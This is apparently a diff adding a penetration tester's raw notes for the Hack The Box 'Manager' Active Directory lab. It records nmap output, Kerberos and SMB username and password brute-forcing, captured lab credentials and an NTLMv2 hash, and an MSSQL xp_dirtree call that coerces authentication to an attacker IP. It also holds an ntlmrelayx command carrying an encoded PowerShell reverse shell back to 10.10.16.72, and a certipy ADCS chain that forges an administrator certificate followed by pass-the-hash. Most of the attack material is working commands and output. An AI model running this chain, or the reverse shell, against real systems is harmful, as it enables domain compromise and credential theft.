@@ -1,0 +1,320 @@
+10.10.11.236
+dc01.manager.htb
+
+ryan
+jinwoo
+zhong
+cheng
+raven
+operator
+guest
+administrator
+
+manager.htb\operator:operator
+
+raven
+R4v3nBe5tD3veloP3r!123
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Nmap 7.94SVN scan initiated Wed Jan  3 21:21:29 2024 as: nmap -sCV -Pn -p- --open -o manager-nmap 10.10.11.236
+Nmap scan report for 10.10.11.236
+Host is up (0.051s latency).
+Not shown: 65512 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Manager
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-03 21:23:26Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
+| Not valid before: 2023-07-30T13:51:28
+|_Not valid after:  2024-07-29T13:51:28
+|_ssl-date: 2024-01-03T21:25:04+00:00; +7h00m00s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-01-03T21:25:03+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
+| Not valid before: 2023-07-30T13:51:28
+|_Not valid after:  2024-07-29T13:51:28
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+|_ssl-date: 2024-01-03T21:25:05+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-01-01T15:41:58
+|_Not valid after:  2054-01-01T15:41:58
+| ms-sql-ntlm-info: 
+|   10.10.11.236:1433: 
+|     Target_Name: MANAGER
+|     NetBIOS_Domain_Name: MANAGER
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: manager.htb
+|     DNS_Computer_Name: dc01.manager.htb
+|     DNS_Tree_Name: manager.htb
+|_    Product_Version: 10.0.17763
+| ms-sql-info: 
+|   10.10.11.236:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-01-03T21:25:05+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
+| Not valid before: 2023-07-30T13:51:28
+|_Not valid after:  2024-07-29T13:51:28
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
+| Not valid before: 2023-07-30T13:51:28
+|_Not valid after:  2024-07-29T13:51:28
+|_ssl-date: 2024-01-03T21:25:03+00:00; +7h00m01s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  msrpc         Microsoft Windows RPC
+49734/tcp open  msrpc         Microsoft Windows RPC
+52937/tcp open  msrpc         Microsoft Windows RPC
+53623/tcp open  unknown
+60744/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-01-03T21:24:27
+|_  start_date: N/A
+|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jan  3 21:25:04 2024 -- 1 IP address (1 host up) scanned in 215.15 seconds
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+53
+	dig any manager.htb @10.10.11.236
+	dig axfr @10.10.11.236 manager.htb
+	dig @10.10.11.236 manager.htb axfr
+	dig A @10.10.11.236 manager.htb       #Regular DNS request
+	dig AAAA @10.10.11.236 manager.htb    #IPv6 DNS request
+	dig TXT @10.10.11.236 manager.htb     #Information
+	dig MX @10.10.11.236 manager.htb      #Emails related
+	dig NS @10.10.11.236 manager.htb
+	
+	
+80 - Web
+	- fuzz dir
+		dirsearch -u http://10.10.11.236:80 -e "*" -r #==> no result
+		dirsearch -u http://10.10.11.236:80 -e "*" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+		
+	- fuzz subdoamin
+		wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.manager.htb" --hc 403,400,301 --hl 506 -t 50 10.10.11.236 #==>> no result
+		wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.hostmaster.manager.htb" --hc 403,400,301 --hl 506 -t 50 10.10.11.236  #==>> no result
+		wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZmaster.manager.htb" --hc 403,400,301 --hl 506 -t 50 10.10.11.236 #==>> no result
+		wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: hostFUZZ.manager.htb" --hc 403,400,301 --hl 506 -t 50 10.10.11.236 #==>> no result 
+88 - Kerberos
+	- enum username:
+		./kerbrute_linux_amd64 userenum -d manager.htb --dc dc01.manager.htb  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt => usernames
+			2024/01/04 23:08:56 >  [+] VALID USERNAME:       ryan@manager.htb
+			2024/01/04 23:08:59 >  [+] VALID USERNAME:       guest@manager.htb
+			2024/01/04 23:09:00 >  [+] VALID USERNAME:       cheng@manager.htb
+			2024/01/04 23:09:03 >  [+] VALID USERNAME:       raven@manager.htb
+			2024/01/04 23:09:16 >  [+] VALID USERNAME:       administrator@manager.htb
+			2024/01/04 23:10:05 >  [+] VALID USERNAME:       operator@manager.htb
+			2024/01/04 23:18:12 >  [+] VALID USERNAME:       jinwoo@manager.htb
+			2024/01/05 01:44:28 >  [+] VALID USERNAME:       zhong@manager.htb
+		impacket-GetUserSPNs -request -dc-ip 10.10.11.236 manager.htb/test111 
+	- with credential:
+		impacket-GetNPUsers -dc-ip 10.10.11.236 -request -outputfile getnpuser manager.htb/operator:operator # ==>No entries found!
+		impacket-GetUserSPNs -request -dc-ip 10.10.11.236 manager.htb/operator:operator # ==>No entries found!
+
+		
+		
+	- bruce password:
+		./kerbrute_linux_amd64 bruteuser -d manager.htb --dc dc01.manager.htb /usr/share/wordlists/rockyou.txt raven
+		
+		
+135 - RPC
+	- enum with null auth
+		rpcclient -U "" -N 10.10.11.236 #No creds
+		impacket-rpcdump 10.10.11.236
+		rpcclient -U "" -N 10.10.11.236 #
+		rpcclient -U "manager.htb/operator%operator" 10.10.11.236 #
+139,445 - Smb
+	- null auth, guess auth 
+		crackmapexec smb manager.htb -u "test111" -p "" --shares
+			SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+			SMB         manager.htb     445    DC01             [+] manager.htb\test111: 
+			SMB         manager.htb     445    DC01             [+] Enumerated shares
+			SMB         manager.htb     445    DC01             Share           Permissions     Remark
+			SMB         manager.htb     445    DC01             -----           -----------     ------
+			SMB         manager.htb     445    DC01             ADMIN$                          Remote Admin
+			SMB         manager.htb     445    DC01             C$                              Default share
+			SMB         manager.htb     445    DC01             IPC$            READ            Remote IPC
+			SMB         manager.htb     445    DC01             NETLOGON                        Logon server share 
+			SMB         manager.htb     445    DC01             SYSVOL                          Logon server share
+		
+		smbclient -U 'test111' //manager.htb/IPC$ 
+		
+		crackmapexec smb 10.10.11.236 -u users.txt -p  -d manager.htb --continue-on-success
+		
+		
+		crackmapexec smb 10.10.11.236 -u operator -p operator -d manager.htb --shares
+			SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
+			SMB         10.10.11.236    445    DC01             -----           -----------     ------
+			SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
+			SMB         10.10.11.236    445    DC01             C$                              Default share
+			SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
+			SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share 
+			SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
+		smbclient -U 'operator%operator' //manager.htb/IPC$  
+		smbclient -U 'operator%operator' //manager.htb/NETLOGON
+		smbclient -U 'operator%operator' //manager.htb/SYSVOL
+		
+	- enum user
+		enum4linux-ng -As dc01.manager.htb #==>> no result
+		enum4linux-ng -w manager.htb -u operator -p operator --local-auth -As dc01.manager.htb
+	- Bruce login
+		for pass in $(cat ./users.txt);do crackmapexec smb 10.10.11.236 -u users.txt -p $pass -d manager.htb --continue-on-success; done
+	
+389,636,3268,3269 - Ldap
+	- null auth
+		ldapsearch -x -H ldap://10.10.11.236 -D '' -w '' -b "CN=USERS,DC=manager,DC=htb" #==> no result
+	- anonymous auth
+		ldapsearch -H ldaps://manage.htb:636 -x -s base -b '' "(objectClass=*)" "*" + #==> noresutl
+	- with credential
+		ldapdomaindump 10.10.11.236 -u 'manager.htb\operator' -p 'operator' --no-json --no-grep -o ./
+		ldapdomaindump 10.10.11.236 -u 'manager.htb\operator' -p 'operator' --no-html --no-grep --grouped-json -o ./
+		
+		ldapsearch -x -H ldap://10.10.11.236 -D 'operator' -w 'operator' -b "CN=Users,DC=manager,DC=htb"
+		
+1433 - Mssql
+	- enum
+		nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 manager.htb
+		impacket-mssqlclient manager.htb/test111:@10.10.11.236
+		impacket-mssqlclient -windows-auth -no-pass manager.htb/sa@10.10.11.236
+	- bruce password:
+		crackmapexec mssql 10.10.11.236 -u MANAGER -p /usr/share/wordlists/rockyou.txt --local-auth 
+		
+	- login
+		impacket-mssqlclient -windows-auth manager.htb/operator:operator@10.10.11.236 ==>> xp_dirtree c:\ to read file => website-backup-27-07-23-old.zip
+		
+	- steal ntlmv2(with cred)
+		exec master.dbo.xp_dirtree '\\10.10.16.72\any\thing' #==> 
+	- directory list(with cred)
+		impacket-mssqlclient -windows-auth manager.htb/operator:operator@10.10.11.236
+		xp_dirtree c:\ ==>> dir list C:\
+5985 - Winrm
+	- with credential
+		crackmapexec winrm 10.10.11.236 -u operator -p operator -d manager.htb #==> no result
+		crackmapexec winrm 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -d manager.htb
+		evil-winrm -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -i 10.10.11.236
+		
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.236
+[SMB] NTLMv2-SSP Username : MANAGER\DC01$
+[SMB] NTLMv2-SSP Hash     : DC01$::MANAGER:d52dddc414932dca:7D0C2AF5A633713960D377257B16FCBD:01010000000000000069766A8B3FDA01E946003FCFE2B26700000000020008004800310033004D0001001E00570049004E002D00300051004F004900380048005600330037003600470004003400570049004E002D00300051004F00490038004800560033003700360047002E004800310033004D002E004C004F00430041004C00030014004800310033004D002E004C004F00430041004C00050014004800310033004D002E004C004F00430041004C00070008000069766A8B3FDA0106000400020000000800300030000000000000000000000000300000CFC4E495AEBACD961DAFF24ABA86EC430CBCFD9DE6C7D4535CCCFB5BD204A3840A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370032000000000000000000
+
+MS02$::OSCP:525B2787930B5DDD:0F1B9C354C76FFFB1D6677C6E23C8363:0101000000000000CF3397...00000000000000
+hashcat -m 5600 ntlmv2-hash /usr/share/wordlists/rockyou.txt --force
+
+
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.11.236 -c "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAyACIALAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+
+Raven	Raven	Raven	Remote Management Users	Domain Users	07/27/23 15:23:10	01/01/24 15:43:13	01/05/24 15:20:34	NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD	07/27/23 15:23:10	1116
+
+raven ==> Remote Management Users	Domain Users
+
+
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.11.236 --query 'select user_name();'
+
+sql => dir listing => backup.zip
+         <user>raven@manager.htb</user>
+         <password>R4v3nBe5tD3veloP3r!123</password>
+
+raven
+R4v3nBe5tD3veloP3r!123
+
+evil-winrm -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -i 10.10.11.236
+ldapsearch -x -H ldap://10.10.91.152 -D 'web_svc' -w 'Diamond1' -b "CN=USERS,DC=OSCP,DC=EXAM"
+ldapsearch -x -H ldap://10.10.11.236 -D 'raven' -w 'R4v3nBe5tD3veloP3r!123' -b "CN=Users,DC=manager,DC=htb"
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+evil-winrm -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -i 10.10.11.236
+
+/home/kali/.local/bin/certipy find -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236
+
+/home/kali/.local/bin/certipy ca -ca 'manager-DC01-CA' -add-officer 'raven' -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123'
+[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
+
+/home/kali/.local/bin/certipy ca -ca 'manager-DC01-CA' -enable-template 'SubCA' -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123'
+[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
+
+/home/kali/.local/bin/certipy req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target 'dc01.manager.htb' -template 'SubCA' -upn 'administrator@manager.htb'
+[*] Requesting certificate via RPC
+[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+[*] Request ID is 32 ==>> ** note this
+Would you like to save the private key? (y/N) y
+[*] Saved private key to 32.key
+[-] Failed to request certificate
+
+/home/kali/.local/bin/certipy ca -ca 'manager-DC01-CA' -issue-request '34' -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' # have to fast 
+[*] Successfully issued certificate
+
+/home/kali/.local/bin/certipy req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target 'dc01.manager.htb' -retrieve 34
+[*] Rerieving certificate with ID 34
+[*] Successfully retrieved certificate
+[*] Got certificate with UPN 'administrator@manager.htb'
+[*] Certificate has no object SID
+[*] Loaded private key from '34.key'
+[*] Saved certificate and private key to 'administrator.pfx'
+
+/home/kali/.local/bin/certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
+[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+
+evil-winrm -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef' -i 10.10.11.236
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+import ldap3
+server = ldap3.Server('10.10.11.236', get_info = ldap3.ALL, port =636, use_ssl = True)
+connection = ldap3.Connection(server="10.10.11.236",authentication="SIMPLE",user="uid=operator,dc=manager,dc=htb",password="operator",read_only=True) 
+connection.bind() // true
+server.info
+
+connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', 
+
+Connection(server="10.10.11.236",authentication="SIMPLE",user="uid=operator,dc=manager,dc=htb",password="operator",read_only=True)
+
+
+
